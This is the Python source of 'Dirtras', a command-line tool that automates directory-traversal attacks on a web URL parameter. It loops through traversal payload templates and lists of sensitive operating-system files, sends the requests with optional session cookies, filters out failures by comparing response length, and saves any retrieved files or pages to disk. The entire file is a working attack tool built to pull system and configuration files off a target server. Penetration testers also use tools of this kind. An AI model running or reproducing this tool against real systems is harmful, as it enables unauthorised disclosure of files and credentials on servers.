# Dirtras - By Nate-one - https://github.com/Nate-one
# python -m pip install requests

from text_data import help_info, bug_info, run_info

from urllib.parse import urlparse
import requests
import sys
import os
import getopt
import time
import re

# Define flag options
short_opts = "hu:o:p:d:f:x:bc:"

long_opts = ["help", "url=", "target-os=", "port=", "delay=",
             "file=", "proxy=", "host-system=", "bugs", "output=", "cookie=", "cookie-name=", "L1", "L2", "L3"]

args = sys.argv

argument_list = args[1:]

file = ""
output = ""

cookie = ""
cookie_name = ""
session_cookie = ""

target_os = "linux"
host_sys = "linux"

url = ""
fail_traversal = "../thisdoesntwork"
traversal_data_list = []

level = "L1"

# Keeps log of file that have been found
file_found_list = []
html_found_list = []


iter_count = 0
port = 80
delay = 0.02

https = False
file_check = False
level_check = False
output_check = False
url_check = False


def is_downloadable(u):
    """
    Does the url contain a downloadable resource
    """
    try:
        head = requests.head(u, allow_redirects=True)
    except requests.exceptions.ConnectionError as err:
        sys.exit(f"Connection Error | {err} | To prevent this try to increase the delay between requests")

    header = head.headers
    content_type = header.get('content-type')

    if "text" in content_type.lower():
        return False

    if "html" in content_type.lower():
        return False

    return True


def get_request(s, u, c=None):
    if not c:
        return s.get(u)

    else:
        return s.get(u, cookies=c)  # Sends request with cookie


print(run_info)

try:
    arguments, values = getopt.getopt(argument_list, short_opts, long_opts)

except getopt.error as error:
    sys.exit(f"{error}\n")

# Get arg/val from terminal
# Assign variables to each one and do basic checks

for arg, val in arguments:

    if arg in ("-h", "--help"):
        print(help_info)

        if len(arguments) <= 1:  # Exits if help is the only flag
            sys.exit()

    if arg in ("-b", "--bugs"):
        print(bug_info)

        if len(arguments) <= 1:
            sys.exit()

    if arg in ("-u", "--url"):
        url, url_check = val, True

        if url[-1:] == "=":  # Last character should be =
            continue
        try:
            url = url[:(url.index("=") + 1)]  # Tries to strip url to get = to last character position

        except ValueError:
            sys.exit(f"Invalid URL - {url} \n\nIt seems that URL isn't affected by directory traversal.")

    if arg == "--target-os":
        target_os = val.lower()
        if target_os in ("linux", "windows"):
            continue
        else:
            sys.exit(f"Invalid OS - {target_os} \n\nUse either \'Linux\' or \'Windows\'")  # Exit if invalid OS defined

    if arg in ("-x", "--proxy"):

        proxy = val

    if arg in ("-p", "--port"):
        try:
            port = int(val)
            continue
        except ValueError as error:
            sys.exit("Error whilst setting port - {error} \n\nUser an integer arguement")

    if arg in ("-d", "--delay"):
        try:
            delay = int(val)
        except ValueError as error:
            sys.exit(f"Error whilst setting delay - {error} \n\nUse an integer arguement")
        continue

    if arg in ("-f", "--file"):
        file, file_check = val, True
        print(file_check)
        continue

    if arg in ("-o", "--output"):
        output, output_check = val, True

    if arg in ("-c", "--cookies"):
        cookie = val
        if "," in cookie:
            cookie = cookie.split(",")

    if arg == "--cookie-name":
        cookie_name = val
        if "," in cookie_name:
            cookie_name = cookie_name.split(",")

    if arg == "--host-system":
        if val.lower() in ("linux", "windows"):
            host_sys = val.lower()
        else:
            sys.exit("Error whilst setting host system | Use \'linux\' or \'windows\'")

    if arg in ("--L1", "--L2", "--L3"):
        level_check, level = True, arg.replace("--", "")


# Check that certain flags have been called

if not file_check and not level_check:
    sys.exit("Directory Traversal Failed - No File Specified | Use -f, --file or --L1, --L2, --L3")

if not url_check:
    sys.exit("Directory Traversal Failed - No URL Specified | Use -u or --url")

# Creates an output folder if one isn't given
if not output_check:

    # Changes default output directory depending on OS
    if host_sys == "windows":
        output, output_check = fr"{os.getcwd()}\\output", True

    else:
        output, output_check = f"{os.getcwd()}/output", True

    print(f"No Output File Specified | Creating a new folder at {output} | Ctrl + C to suspend | Use -o or --output")

    time.sleep(5)

# Advises that https is not usually on port 80

if "https" in url and port == 80:
    print("It seems you're going against convention and asking for https while using port 80? Continuing...")
    time.sleep(3)

# Recommends increased delay

if delay < 0.02:
    print("It is suggested that you use a delay value higher than 0.02 to prevent ephemeral port exhaustion")
    time.sleep(1)

# Checks cookie name exists if a cookie is given

if not cookie_name and cookie:
    sys.exit("You must define the name of the cookie when using session cookies e.g PHPSESSID")

# Checks cookie input and sets session cookie dictionary

if cookie_name and cookie:
    session_cookie = {}
    # Advises that number of cookies and cookie names
    if len(cookie) != len(cookie_name):
        sys.exit("You must provide the same number of cookie names to cookies.")

    # If there's only one cookie name / cookie set the variable manually
    if (len(cookie) and len(cookie_name)) == 1:
        session_cookie = {cookie_name: cookie}

    else:
        # Uses split cookie names and cookies to create cookie dictionary
        for i in range(len(cookie_name)):
            session_cookie[cookie_name[i]] = cookie[i]


# Attempt to create output directories

try:
    if host_sys == "windows":
        os.mkdir(fr"{output}\\html")
        os.mkdir(fr"{output}\\downloaded")
    else:
        os.mkdir(f"{output}\html")
        os.mkdir(f"{output}\downloaded")

except FileExistsError as error:
    print(f"Folder {output} already exists.  Continuing...")
    time.sleep(1)


# If levels are being used | find their directory and use it as file var
if level_check:

    if host_sys == "windows":
        file = f"{os.path.dirname(os.path.realpath(__file__))}\\content\\{level}.txt"

    else:
        file = f"{os.path.dirname(os.path.realpath(__file__))}/content/{level}.txt"

# Creates os_file var | directories to search for
if host_sys == "windows":
    os_file = f"{os.path.dirname(os.path.realpath(__file__))}\\content\\{target_os}_files.txt"

else:
    os_file = f"{os.path.dirname(os.path.realpath(__file__))}/content/{target_os}_files.txt"

with open(file, "r") as traverse_file, open(os_file, "r") as interest_dirs:

    session = requests.session()

    # Read files to remove the need to change the pointer
    list_of_traversal_techniques = traverse_file.readlines()
    list_of_directories = interest_dirs.readlines()

    # Gets the number of files that are supposed to be retrieved
    files_to_get = len(list_of_directories)

    # Counts number of files found
    file_counter = 0

    # Calculates number of iterations for user
    num_of_iterations = len(list_of_traversal_techniques) * len(list_of_directories)

    # By using a traversal directory that is going to fail
    # we can find the byte length of what a failed traversal would be
    # which reduces the need for manual review of thousands of files

    fail_url = url + fail_traversal  # Creates the url to fail

    try:

        failed_traversal = get_request(session, fail_url, session_cookie)

    except Exception as error:
        sys.exit(f"Failed To Get Failed Traversal Content For Comparison | {error}")

    # Get byte length of what a failed traversal would be
    failed_traversal_content_len = len(failed_traversal.content)

    # Iterate through different traversal techniques
    for traversal_technique in list_of_traversal_techniques:

        # Iterate through os relevant directories
        for directory_to_try in list_of_directories:

            # Delay and count here isntead of at the end of every if statement
            time.sleep(delay)
            iter_count += 1

            # Removes / start from the directory so it isn't duplicated
            if directory_to_try[:1] in ("/", "\\"):
                directory_to_try = directory_to_try[1:]

            # Creates the traversal directory/interest file and removes trailing \n
            directory_os_dir = fr"{traversal_technique[:-1]}"
            directory_os_dir = re.sub("{FILE}|{FILE", f"{directory_to_try[:-1]}", directory_os_dir)

            # Create urllib parse object
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"  # Scheme + Hostname

            # Creates url with traversel/directory

            url_directory_built = f"{url[len(base_url):]}{directory_os_dir}"

            # Creates final url
            built_url = f"{url[:len(base_url) - 1]}:{port}/{url_directory_built}"

            # Attempt to send request and handle exception
            try:
                if not cookie:
                    dir_traversal_target = session.get(built_url, timeout=3)

                else:
                    # Sends request with cookie
                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)

            except Exception as error:
                session = requests.session()
                print(f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get}"
                      f" | HTTP Error - {error} | ", end="")
                print(f"Current URL: {built_url[0:80]}... ", end="")
                print("", end="\r", flush=True)
                continue

            # Display current stats - URL, Status, Length and Iteration

            print(f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | "
                  f"Length - {len(dir_traversal_target.content)} | ", end="")
            print(f"Current URL: {built_url[0:80]}... ", end="")
            print("", end="\r", flush=True)

            # The following takes the current URL and checks

            if is_downloadable(built_url):

                # Get content disposition from header and build file name from it
                # By using content-disposition it removes the need to create filenames based on target OS

                file_download_name = dir_traversal_target.headers.get('content-disposition')
                file_download_name = re.sub(r"[^A-Za-z0-9]+", "", file_download_name)

                # If the content is empty continue
                if len(dir_traversal_target.content) == 0:
                    continue

                # Skip files that have already been found
                if (file_download_name, len(dir_traversal_target.content)) in file_found_list:
                    continue

                file_found_list.append((file_download_name, len(dir_traversal_target.content)))

                # Save downloadable content to downloaded folder

                if host_sys == "windows":

                    # Windows directory formatting
                    open(fr"{output}\\downloaded\\{file_download_name}_{iter_count}.txt",
                         "wb").write(dir_traversal_target.content)

                    file_counter += 1
                    continue

                else:

                    # Linux directory formatting
                    open(f"{output}/downloaded/{file_download_name}_{iter_count}.txt",
                         "wb").write(dir_traversal_target.content)

                    file_counter += 1
                    continue

            # If the traversal failed, continue
            if len(dir_traversal_target.content) == failed_traversal_content_len:
                continue

            # Save content to html folder with specific name / formatting
            else:

                # If the returned content is empty continue
                if len(dir_traversal_target.content) == 0:
                    continue

                # If the content has already been found, skip
                if directory_to_try in html_found_list:
                    continue

                html_found_list.append(directory_to_try)  # Append the file that has been found

                #  Creates filename depending on target OS

                if target_os == "windows":
                    # Reduces need to chain multiple replace lines
                    os_dir_file = directory_to_try.split(r"\\")[-1].rstrip("\n")
                    os_dir_file = re.sub(r"[^A-Za-z0-9]+", "", os_dir_file)

                else:
                    # For Linux
                    os_dir_file = directory_to_try.rstrip("\n")
                    os_dir_file = re.sub(r"[^A-Za-z0-9]+", "", os_dir_file)

                # Create directory filenames for specific host operating system
                win_dir_filename = fr"{output}\\html\\{os_dir_file}_content_{iter_count}.html"
                linux_dir_filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html"

                try:
                    if host_sys == "windows":
                        open(win_dir_filename, "wb").write(dir_traversal_target.content)
                        file_counter += 1

                    else:
                        open(linux_dir_filename, "wb").write(dir_traversal_target.content)
                        file_counter += 1

                except OSError as error:
                    sys.exit(f"OS Error Occurred | {error} | Maybe you need to set --host-system?")
